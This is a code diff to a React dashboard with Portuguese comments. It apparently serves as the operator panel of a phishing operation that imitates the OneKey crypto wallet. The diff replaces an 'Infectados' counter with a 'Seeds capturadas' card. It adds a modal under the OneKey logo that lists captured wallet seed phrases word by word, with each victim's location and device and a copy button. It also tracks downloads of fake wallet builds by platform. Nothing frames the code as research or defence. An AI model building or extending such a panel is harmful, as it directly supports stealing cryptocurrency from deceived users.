@@ -6,16 +6,31 @@ import DeviceDetector from "device-detector-js";
 export default function Dashboard() {
   const [visitas, setVisitas] = useState<any[]>([]);
   const [downloads, setDownloads] = useState<any[]>([]);
+  const [seeds, setSeeds] = useState<any[]>([]);
   const [showVisitasModal, setShowVisitasModal] = useState(false);
+  const [showSeedsModal, setShowSeedsModal] = useState(false);
 
   useEffect(() => {
     const eventosRef = ref(db, "eventos");
-    return onValue(eventosRef, (snapshot) => {
+    const seedsRef = ref(db, "seeds");
+
+    const unsubscribeEventos = onValue(eventosRef, (snapshot) => {
       const val = snapshot.val() || {};
       const eventos = Object.values(val);
       setVisitas(eventos.filter((e: any) => e.tipo === "visita"));
       setDownloads(eventos.filter((e: any) => e.tipo === "download"));
     });
+
+    const unsubscribeSeeds = onValue(seedsRef, (snapshot) => {
+      const val = snapshot.val() || {};
+      const seedsData = Object.values(val);
+      setSeeds(seedsData);
+    });
+
+    return () => {
+      unsubscribeEventos();
+      unsubscribeSeeds();
+    };
   }, []);
 
   // Contagem de visitas hoje
@@ -24,8 +39,23 @@ export default function Dashboard() {
     (v) => (v.data || "").slice(0, 10) === hoje
   ).length;
 
+  // Contagem de seeds hoje
+  const seedsHoje = seeds.filter(
+    (s) => (s.data || "").slice(0, 10) === hoje
+  ).length;
+
   // Função para formatar números
   const formatNumber = (num: number) => num.toLocaleString("pt-BR");
+
+  // Função para copiar seed para clipboard
+  const copyToClipboard = async (text: string) => {
+    try {
+      await navigator.clipboard.writeText(text);
+      // Você pode adicionar um toast aqui se quiser
+    } catch (err) {
+      console.error("Erro ao copiar:", err);
+    }
+  };
 
   // Função para obter código da bandeira
   function getFlagCode(v: any) {
@@ -89,6 +119,16 @@ export default function Dashboard() {
     if (browserLower.includes("edge")) return "🌐";
     return "🌐";
   }
+
+  const platformLabelMap: Record<string, string> = {
+    windows: "Windows",
+    macos: "macOS",
+    android: "Android APK",
+    googleplay: "Google Play",
+    chrome: "Chrome",
+    linux: "Linux",
+    pontehardware: "Ponte de hardware",
+  };
 
   return (
     <div className="min-h-screen bg-gray-900 text-white">
@@ -193,11 +233,14 @@ export default function Dashboard() {
               </div>
             </div>
           </div>
-          {/* Card Infectados (mock) */}
-          <div className="bg-gray-800/50 backdrop-blur-sm border border-gray-700 rounded-xl p-6">
+          {/* Card Seeds */}
+          <div
+            className="bg-gray-800/50 backdrop-blur-sm border border-gray-700 rounded-xl p-6 cursor-pointer hover:bg-gray-800/70 transition-colors"
+            onClick={() => setShowSeedsModal(true)}
+          >
             <div className="flex items-center justify-between mb-4">
               <div className="flex items-center space-x-3">
-                <div className="w-12 h-12 bg-gradient-to-r from-red-500 to-red-600 rounded-lg flex items-center justify-center">
+                <div className="w-12 h-12 bg-gradient-to-r from-purple-500 to-purple-600 rounded-lg flex items-center justify-center">
                   <svg
                     className="w-6 h-6 text-white"
                     fill="none"
@@ -208,29 +251,31 @@ export default function Dashboard() {
                       strokeLinecap="round"
                       strokeLinejoin="round"
                       strokeWidth={2}
-                      d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L3.732 16.5c-.77.833.192 2.5 1.732 2.5z"
+                      d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                     />
                   </svg>
                 </div>
                 <div>
-                  <h3 className="text-lg font-semibold text-gray-100">
-                    Infectados
-                  </h3>
-                  <p className="text-sm text-gray-400">Casos detectados</p>
+                  <h3 className="text-lg font-semibold text-gray-100">Seeds</h3>
+                  <p className="text-sm text-gray-400">Seeds capturadas</p>
                 </div>
               </div>
-              <span className="bg-red-500/20 text-red-400 px-2 py-1 rounded-full text-xs font-medium">
-                0
+              <span className="bg-purple-500/20 text-purple-400 px-2 py-1 rounded-full text-xs font-medium">
+                {formatNumber(seeds.length)}
               </span>
             </div>
             <div className="space-y-3">
               <div className="flex items-center justify-between">
-                <span className="text-3xl font-bold text-gray-100">0</span>
+                <span className="text-3xl font-bold text-gray-100">
+                  {formatNumber(seeds.length)}
+                </span>
                 <span className="text-sm text-gray-400">Total</span>
               </div>
               <div className="flex items-center justify-between text-sm">
                 <span className="text-gray-400">Hoje:</span>
-                <span className="text-gray-200 font-medium">0</span>
+                <span className="text-gray-200 font-medium">
+                  {formatNumber(seedsHoje)}
+                </span>
               </div>
             </div>
           </div>
@@ -279,7 +324,7 @@ export default function Dashboard() {
         {/* Card de clientes que baixaram */}
         <div className="mt-8">
           <h3 className="text-lg font-bold mb-4">Clientes que baixaram</h3>
-          <div className="grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-4">
+          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
             {downloads
               .slice(-12)
               .reverse()
@@ -291,70 +336,70 @@ export default function Dashboard() {
                   deviceInfo.os
                 );
                 const browserIcon = getBrowserIcon(deviceInfo.browser);
-
+                const platformLabel =
+                  platformLabelMap[String(d.origem)] || d.origem;
                 return (
                   <div
                     key={i}
-                    className="bg-gray-800/50 backdrop-blur-sm border border-gray-700 rounded-xl p-4 hover:bg-gray-800/70 transition-all duration-200"
+                    className="bg-gray-800/80 border border-green-500 rounded-xl shadow p-4 flex flex-col gap-2 min-h-[90px] hover:scale-[1.01] transition-transform"
                   >
-                    {/* Primeira linha: País, Bandeira e Data */}
-                    <div className="flex items-center justify-between mb-3">
-                      <div className="flex items-center gap-3">
-                        <img
-                          src={
-                            flagCode
-                              ? `https://flagcdn.com/32x24/${flagCode}.png`
-                              : "/public/mundo.svg"
-                          }
-                          alt={d.pais}
-                          className="w-6 h-4 rounded border bg-gray-100 object-cover"
-                          onError={(e) =>
-                            (e.currentTarget.src = "/public/mundo.svg")
-                          }
-                        />
-                        <div>
-                          <div className="font-semibold text-sm text-gray-100">
-                            {d.pais || "Desconhecido"}
-                          </div>
-                          <div className="text-xs text-gray-400">
-                            {d.cidade}
-                            {d.estado ? `, ${d.estado}` : ""}
-                          </div>
-                        </div>
-                      </div>
-                      <div className="text-xs text-gray-500 text-right">
-                        {new Date(d.data).toLocaleDateString()}
-                      </div>
+                    <div className="flex items-center gap-2">
+                      <img
+                        src={
+                          flagCode
+                            ? `https://flagcdn.com/32x24/${flagCode}.png`
+                            : "/public/mundo.svg"
+                        }
+                        alt={d.pais}
+                        className="w-7 h-5 rounded border bg-gray-100 object-cover shadow"
+                        onError={(e) =>
+                          (e.currentTarget.src = "/public/mundo.svg")
+                        }
+                      />
+                      <span className="font-semibold text-sm text-white truncate max-w-[80px]">
+                        {d.pais || "Desconhecido"}
+                      </span>
+                      <span className="text-xs text-gray-400 truncate max-w-[60px]">
+                        {d.cidade}
+                        {d.estado ? `, ${d.estado}` : ""}
+                      </span>
                     </div>
-
-                    {/* Segunda linha: Dispositivo e Navegador */}
-                    <div className="flex items-center justify-between">
-                      <div className="flex items-center gap-2">
-                        <span className="text-lg">{deviceIcon}</span>
-                        <div className="text-xs">
-                          <div className="text-gray-300 font-medium">
-                            {deviceInfo.brand && deviceInfo.model
-                              ? `${deviceInfo.brand} ${deviceInfo.model}`
-                              : deviceInfo.device === "desktop"
-                              ? "Desktop"
-                              : deviceInfo.device === "smartphone"
-                              ? "Smartphone"
-                              : deviceInfo.device === "tablet"
-                              ? "Tablet"
-                              : "Dispositivo"}
-                          </div>
-                          <div className="text-gray-500">
-                            {deviceInfo.os} {deviceInfo.osVersion}
-                          </div>
-                        </div>
-                      </div>
-                      <div className="flex items-center gap-1">
-                        <span className="text-sm">{browserIcon}</span>
-                        <div className="text-xs text-gray-400 text-right">
-                          <div>{deviceInfo.browser}</div>
-                          <div>{deviceInfo.browserVersion}</div>
-                        </div>
-                      </div>
+                    <div className="flex items-center gap-2 text-xs text-green-400 font-bold">
+                      <span>Baixou</span>
+                      <span className="bg-green-700/30 px-2 py-0.5 rounded-full text-white text-xs font-semibold">
+                        {platformLabel}
+                      </span>
+                    </div>
+                    <div className="flex flex-wrap gap-2 text-xs">
+                      <span className="flex items-center gap-1 bg-gray-900/60 px-2 py-0.5 rounded">
+                        <span>{deviceIcon}</span>
+                        <span className="text-white font-medium">
+                          {deviceInfo.brand && deviceInfo.model
+                            ? `${deviceInfo.brand} ${deviceInfo.model}`
+                            : deviceInfo.device === "desktop"
+                            ? "Desktop"
+                            : deviceInfo.device === "smartphone"
+                            ? "Smartphone"
+                            : deviceInfo.device === "tablet"
+                            ? "Tablet"
+                            : "Dispositivo"}
+                        </span>
+                        <span className="text-gray-400 ml-1">
+                          {deviceInfo.os} {deviceInfo.osVersion}
+                        </span>
+                      </span>
+                      <span className="flex items-center gap-1 bg-gray-900/60 px-2 py-0.5 rounded">
+                        <span>{browserIcon}</span>
+                        <span className="text-white font-medium">
+                          {deviceInfo.browser}
+                        </span>
+                        <span className="text-gray-400 ml-1">
+                          {deviceInfo.browserVersion}
+                        </span>
+                      </span>
+                    </div>
+                    <div className="text-[10px] text-gray-400 mt-1">
+                      {new Date(d.data).toLocaleString()}
                     </div>
                   </div>
                 );
@@ -434,6 +479,147 @@ export default function Dashboard() {
               .custom-scroll::-webkit-scrollbar { width: 8px; }
               .custom-scroll::-webkit-scrollbar-thumb { background: #e5e7eb; border-radius: 4px; }
             `}</style>
+          </div>
+        )}
+        {/* Modal de seeds */}
+        {showSeedsModal && (
+          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-60 animate-fade-in">
+            <div className="bg-gray-900 text-white rounded-2xl p-8 max-w-4xl w-full shadow-2xl relative animate-fade-in transition-all duration-300">
+              <button
+                className="absolute top-4 right-6 text-2xl text-gray-400 hover:text-white transition-colors"
+                onClick={() => setShowSeedsModal(false)}
+                aria-label="Fechar"
+              >
+                ✕
+              </button>
+
+              {/* Header com logo OneKey */}
+              <div className="flex items-center justify-center mb-8">
+                <div className="flex items-center gap-4">
+                  <img src="/logo.svg" alt="OneKey" className="w-12 h-12" />
+                  <h2 className="text-3xl font-bold text-white">
+                    Seeds Capturadas
+                  </h2>
+                </div>
+              </div>
+
+              {/* Grid de seeds */}
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-6 max-h-[70vh] overflow-y-auto pr-2 custom-scroll">
+                {seeds
+                  .slice(-20)
+                  .reverse()
+                  .map((s, i) => {
+                    const flagCode = getFlagCode(s);
+                    const seedWords = s.seed ? s.seed.split(" ") : [];
+                    const seedCount = seedWords.length;
+
+                    return (
+                      <div
+                        key={i}
+                        className="bg-gray-800/80 border border-purple-500/30 rounded-xl p-6 hover:border-purple-500/50 transition-all duration-300 hover:scale-[1.02]"
+                      >
+                        {/* Header do card */}
+                        <div className="flex items-center justify-between mb-4">
+                          <div className="flex items-center gap-3">
+                            <img
+                              src={
+                                flagCode
+                                  ? `https://flagcdn.com/32x24/${flagCode}.png`
+                                  : "/public/mundo.svg"
+                              }
+                              alt={s.pais}
+                              className="w-8 h-6 rounded border bg-gray-100 object-cover"
+                              onError={(e) =>
+                                (e.currentTarget.src = "/public/mundo.svg")
+                              }
+                            />
+                            <div>
+                              <div className="font-semibold text-white">
+                                {s.pais || "Desconhecido"}
+                              </div>
+                              <div className="text-xs text-gray-400">
+                                {s.cidade}
+                                {s.estado ? `, ${s.estado}` : ""}
+                              </div>
+                            </div>
+                          </div>
+                          <div className="text-right">
+                            <div className="text-xs text-gray-400">
+                              {new Date(s.data).toLocaleDateString()}
+                            </div>
+                            <div className="text-xs text-purple-400 font-medium">
+                              {seedCount} palavras
+                            </div>
+                          </div>
+                        </div>
+
+                        {/* Seed words */}
+                        <div className="mb-4">
+                          <div className="text-sm text-gray-400 mb-2">
+                            Seed Phrase:
+                          </div>
+                          <div className="bg-gray-900/60 rounded-lg p-3 border border-gray-700">
+                            <div className="grid grid-cols-3 gap-2 text-sm">
+                              {seedWords.map((word: string, idx: number) => (
+                                <div
+                                  key={idx}
+                                  className="flex items-center gap-1"
+                                >
+                                  <span className="text-gray-500 text-xs w-4">
+                                    {idx + 1}.
+                                  </span>
+                                  <span className="text-white font-mono">
+                                    {word}
+                                  </span>
+                                </div>
+                              ))}
+                            </div>
+                          </div>
+                        </div>
+
+                        {/* Botão copiar */}
+                        <div className="flex justify-end">
+                          <button
+                            onClick={() => copyToClipboard(s.seed)}
+                            className="flex items-center gap-2 px-4 py-2 text-sm text-white bg-purple-600 rounded-lg hover:bg-purple-700 transition-colors"
+                          >
+                            <svg
+                              className="w-4 h-4"
+                              fill="none"
+                              stroke="currentColor"
+                              viewBox="0 0 24 24"
+                            >
+                              <path
+                                strokeLinecap="round"
+                                strokeLinejoin="round"
+                                strokeWidth={2}
+                                d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-6 9l2 2 4-4"
+                              />
+                            </svg>
+                            Copiar Seed
+                          </button>
+                        </div>
+                      </div>
+                    );
+                  })}
+                {seeds.length === 0 && (
+                  <div className="text-center text-gray-500 py-12 col-span-full">
+                    <div className="text-6xl mb-4">🔒</div>
+                    <div className="text-xl font-semibold mb-2">
+                      Nenhuma seed registrada
+                    </div>
+                    <div className="text-gray-400">
+                      As seeds digitadas no modal da carteira aparecerão aqui
+                    </div>
+                  </div>
+                )}
+              </div>
+            </div>
+            <style>{`
+               .custom-scroll::-webkit-scrollbar { width: 8px; }
+               .custom-scroll::-webkit-scrollbar-thumb { background: #4b5563; border-radius: 4px; }
+               .custom-scroll::-webkit-scrollbar-track { background: #1f2937; border-radius: 4px; }
+             `}</style>
           </div>
         )}
       </main>
